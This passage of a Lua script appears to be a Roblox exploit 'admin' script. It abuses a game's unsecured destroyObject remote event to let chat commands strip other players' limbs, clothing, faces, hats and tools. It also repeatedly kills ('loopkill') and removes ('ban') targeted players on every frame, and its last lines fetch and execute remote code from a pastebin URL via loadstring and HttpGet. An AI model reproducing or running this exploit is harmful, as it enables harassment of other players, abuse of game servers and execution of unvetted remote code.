                            replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Arm"])
                        end
                        if playersService[v].Character:FindFirstChild("Right Arm") then
                            replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Arm"])
                        end
                        if playersService[v].Character:FindFirstChild("Left Leg") then
                            replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Leg"])
                        end
                        if playersService[v].Character:FindFirstChild("Right Leg") then
                            replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Leg"])
                        end
                    end
                end
            end)

            Command82 = playersService[v].Chatted:Connect(function(msg)
                if msg:lower():sub(1,12+Prefix:len()) == Prefix.."removelimbs " then
                    for i,v in pairs(GetPlayer(string.sub(msg,13+Prefix:len()))) do
                        if playersService[v].Character:FindFirstChild("Left Arm") then
                            replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Arm"])
                        end
                        if playersService[v].Character:FindFirstChild("Right Arm") then
                            replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Arm"])
                        end
                        if playersService[v].Character:FindFirstChild("Left Leg") then
                            replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Leg"])
                        end
                        if playersService[v].Character:FindFirstChild("Right Leg") then
                            replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Leg"])
                        end
                    end
                end
            end)

            Command83 = playersService[v].Chatted:Connect(function(msg)
                if msg:lower():sub(1,6+Prefix:len()) == Prefix.."rarms " then
                    for i,v in pairs(GetPlayer(string.sub(msg,7+Prefix:len()))) do
                        if playersService[v].Character:FindFirstChild("Left Arm") then
                            replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Arm"])
                        end
                        if playersService[v].Character:FindFirstChild("Left Arm") then
                            replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Arm"])
                        end
                    end
                end
            end)

            Command84 = playersService[v].Chatted:Connect(function(msg)
                if msg:lower():sub(1,11+Prefix:len()) == Prefix.."removearms " then
                    for i,v in pairs(GetPlayer(string.sub(msg,12+Prefix:len()))) do
                        if playersService[v].Character:FindFirstChild("Left Arm") then
                            replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Arm"])
                        end
                        if playersService[v].Character:FindFirstChild("Left Arm") then
                            replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Arm"])
                        end
                    end
                end
            end)

            Command85 = playersService[v].Chatted:Connect(function(msg)
                if msg:lower():sub(1,6+Prefix:len()) == Prefix.."rlegs " then
                    for i,v in pairs(GetPlayer(string.sub(msg,7+Prefix:len()))) do
                        if playersService[v].Character:FindFirstChild("Left Leg") then
                            replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Leg"])
                        end
                        if playersService[v].Character:FindFirstChild("Right Leg") then
                            replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Leg"])
                        end
                    end
                end
            end)

            Command86 = playersService[v].Chatted:Connect(function(msg)
                if msg:lower():sub(1,11+Prefix:len()) == Prefix.."removelegs " then
                    for i,v in pairs(GetPlayer(string.sub(msg,12+Prefix:len()))) do
                        if playersService[v].Character:FindFirstChild("Left Leg") then
                            replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Leg"])
                        end
                        if playersService[v].Character:FindFirstChild("Right Leg") then
                            replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Leg"])
                        end
                    end
                end
            end)

            Command87 = playersService[v].Chatted:Connect(function(msg)
                if msg:lower():sub(1,6+Prefix:len()) == Prefix.."naked " then
                    for i,v in pairs(GetPlayer(string.sub(msg,7+Prefix:len()))) do
                        if playersService[v].Character:FindFirstChild("Shirt") then
                            replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Shirt)
                        else
                        end
                        if playersService[v].Character:FindFirstChild("Pants") then
                            replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Pants)
                        else
                        end
                        if playersService[v].Character:FindFirstChild("Shirt Graphic") then
                            replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Shirt Graphic"])
                        else
                        end
                    end
                end
            end)

            Command88 = playersService[v].Chatted:Connect(function(msg)
                if msg:lower():sub(1,7+Prefix:len()) == Prefix.."nayked " then
                    for i,v in pairs(GetPlayer(string.sub(msg,8+Prefix:len()))) do
                        if playersService[v].Character:FindFirstChild("Shirt") then
                            replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Shirt)
                        else
                        end
                        if playersService[v].Character:FindFirstChild("Pants") then
                            replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Pants)
                        else
                        end
                        if playersService[v].Character:FindFirstChild("Shirt Graphic") then
                            replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Shirt Graphic"])
                        else
                        end
                    end
                end
            end)

            Command89 = playersService[v].Chatted:Connect(function(msg)
                if msg:lower():sub(1,9+Prefix:len()) == Prefix.."faceless " then
                    for i,v in pairs(GetPlayer(string.sub(msg,10+Prefix:len()))) do
                        replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Head:FindFirstChildOfClass("Decal"))
                    end
                end
            end)

            Command90 = playersService[v].Chatted:Connect(function(msg)
                if msg:lower():sub(1,6+Prefix:len()) == Prefix.."rface " then
                    for i,v in pairs(GetPlayer(string.sub(msg,7+Prefix:len()))) do
                        if adminScript.Data._localPlayer.Character.Head:FindFirstChild("face") then
                            replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Head:FindFirstChildOfClass("Decal"))
                        end
                    end
                end
            end)

            Command91 = playersService[v].Chatted:Connect(function(msg)
                if msg:lower():sub(1,11+Prefix:len()) == Prefix.."removeface " then
                    for i,v in pairs(GetPlayer(string.sub(msg,12+Prefix:len()))) do
                        if adminScript.Data._localPlayer.Character.Head:FindFirstChild("face") then
                            replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Head:FindFirstChildOfClass("Decal"))
                        end
                    end
                end
            end)

            Command92 = playersService[v].Chatted:Connect(function(msg)
                if msg:lower():sub(1,6+Prefix:len()) == Prefix.."rhats " then
                    for i,v in pairs(GetPlayer(string.sub(msg,7+Prefix:len()))) do
                        for x,o in pairs(playersService[v].Character:GetChildren()) do
                            if o:IsA("Accessory") then
                                replicatedStorage.events.destroyObject:FireServer(o)
                            end
                        end
                    end
                end
            end)

            Command93 = playersService[v].Chatted:Connect(function(msg)
                if msg:lower():sub(1,11+Prefix:len()) == Prefix.."removehats " then
                    for i,v in pairs(GetPlayer(string.sub(msg,12+Prefix:len()))) do
                        for x,o in pairs(playersService[v].Character:GetChildren()) do
                            if o:IsA("Accessory") then
                                replicatedStorage.events.destroyObject:FireServer(o)
                            end
                        end
                    end
                end
            end)

            Command94 = playersService[v].Chatted:Connect(function(msg)
                if msg:lower():sub(1,8+Prefix:len()) == Prefix.."creeper " then
                    for i,v in pairs(GetPlayer(string.sub(msg,9+Prefix:len()))) do
                        if playersService[v].Character.Head:FindFirstChild("Mesh") then
                            replicatedStorage.events.destroyObject:FireServer(playersService[v].Character.Head.Mesh)
                        end
                        if playersService[v].Character:FindFirstChild("Left Arm") then
                            replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Left Arm"])
                        end
                        if playersService[v].Character:FindFirstChild("Right Arm") then
                            replicatedStorage.events.destroyObject:FireServer(playersService[v].Character["Right Arm"])
                        end
                    end
                end
            end)

            Command95 = playersService[v].Chatted:Connect(function(msg)
                if msg:lower():sub(1,8+Prefix:len()) == Prefix.."toolban " then
                    for i,v in pairs(GetPlayer(string.sub(msg,9+Prefix:len()))) do
                        table.insert(toolbanned,playersService[v].Name)
                    end
                end
            end)

            Command96 = playersService[v].Chatted:Connect(function(msg)
                if msg:lower():sub(1,10+Prefix:len()) == Prefix.."untoolban " then
                    for i,v in pairs(GetPlayer(string.sub(msg,11+Prefix:len()))) do
                        for j,k in pairs(toolbanned) do
                            if string.match(k,v) then
                                table.remove(toolbanned,j)
                            end
                        end
                    end
                end
            end)
        end
    end
end)

createCommand:Connect(function(msg)
    if msg:lower():sub(1,16+Prefix:len()) == Prefix.."unadministrator " then
        for i,v in pairs(GetPlayer(string.sub(msg,17+Prefix:len()))) do
            for j,k in pairs(administrators) do
                if string.match(k,v) then
                    table.remove(administrators,j)
                    Command68 = playersService[v].Chatted:Disconnect()
                    Command69 = playersService[v].Chatted:Disconnect()
                    Command70 = playersService[v].Chatted:Disconnect()
                    Command71 = playersService[v].Chatted:Disconnect()
                    Command72 = playersService[v].Chatted:Disconnect()
                    Command73 = playersService[v].Chatted:Disconnect()
                    Command74 = playersService[v].Chatted:Disconnect()
                    Command75 = playersService[v].Chatted:Disconnect()
                    Command76 = playersService[v].Chatted:Disconnect()
                    Command77 = playersService[v].Chatted:Disconnect()
                    Command78 = playersService[v].Chatted:Disconnect()
                    Command79 = playersService[v].Chatted:Disconnect()
                    Command80 = playersService[v].Chatted:Disconnect()
                    Command81 = playersService[v].Chatted:Disconnect()
                    Command82 = playersService[v].Chatted:Disconnect()
                    Command83 = playersService[v].Chatted:Disconnect()
                    Command84 = playersService[v].Chatted:Disconnect()
                    Command85 = playersService[v].Chatted:Disconnect()
                    Command86 = playersService[v].Chatted:Disconnect()
                    Command87 = playersService[v].Chatted:Disconnect()
                    Command88 = playersService[v].Chatted:Disconnect()
                    Command89 = playersService[v].Chatted:Disconnect()
                    Command90 = playersService[v].Chatted:Disconnect()
                    Command91 = playersService[v].Chatted:Disconnect()
                    Command92 = playersService[v].Chatted:Disconnect()
                    Command93 = playersService[v].Chatted:Disconnect()
                    Command94 = playersService[v].Chatted:Disconnect()
                    Command95 = playersService[v].Chatted:Disconnect()
                    Command96 = playersService[v].Chatted:Disconnect()
                end
            end
        end
    end
end)

--loop functions
function Ban()
    for i,v in pairs(banned) do
        if playersService:FindFirstChild(v) then
            replicatedStorage.events.destroyObject:FireServer(playersService[v])
        end
    end
end

function Loopkill()
    for i,v in pairs(loopkilled) do
        if playersService:FindFirstChild(v) then
        torso = playersService[v].Character:FindFirstChild("Torso")
            if torso then
                neck = torso:FindFirstChild("Neck")
                if neck then
                    replicatedStorage.events.destroyObject:FireServer(neck)
                end
            end
        end
    end
end

function Toolban()
    for i,v in pairs(toolbanned) do
        if playersService:FindFirstChild(v) then
            for j,k in pairs(playersService[v].Backpack:GetChildren()) do
                replicatedStorage.events.destroyObject:FireServer(k)
            end
            for j,k in pairs(playersService[v].Character:GetChildren()) do
                if k:IsA("Tool") then
                    replicatedStorage.events.destroyObject:FireServer(k)
                end
            end
        end
    end
end

runService.Heartbeat:Connect(Ban)
runService.Heartbeat:Connect(Loopkill)
runService.Heartbeat:Connect(Toolban)

--join message
coroutine.resume(coroutine.create(function()
loadstring(game:HttpGet(("https://pastebin.com/raw/6YxySbWn"),true))()
end))
